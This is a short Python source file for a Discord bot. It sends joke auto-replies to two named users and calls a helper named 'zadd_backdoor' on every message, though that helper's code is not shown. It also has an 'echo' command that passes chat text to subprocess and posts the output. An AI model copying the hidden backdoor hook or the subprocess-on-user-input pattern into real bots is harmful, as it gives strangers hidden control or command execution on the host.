import os
import subprocess

import discord
from dotenv import load_dotenv

import zadd_handlers as zh

intents = discord.Intents.default()
intents.message_content = True

client = discord.Client(intents=intents)

COMTEK_P3_GUILD_ID = 1412345322968977450


@client.event
async def on_ready():
    print(f"We have logged in as {client.user}")


@client.event
async def on_message(message: discord.Message):
    if message.author == client.user:
        return

    await zh.zadd_backdoor(message)
    await zh.always_respond_to(
        message, "m4rt1n1955", "Martin Martin er en uran hjort..."
    )
    await zh.always_respond_to(
        message, "alehandre", "Skibidi toilet sunset rizzler morning"
    )

    if message.content.startswith("echo"):
        print("Recieved:", message.content.split())
        await message.channel.send(
            subprocess.check_output(message.content.split()).decode("utf-8").strip()
        )


if __name__ == "__main__":
    load_dotenv()
    client.run(os.getenv("DISCORD_TOKEN").strip("<>"))
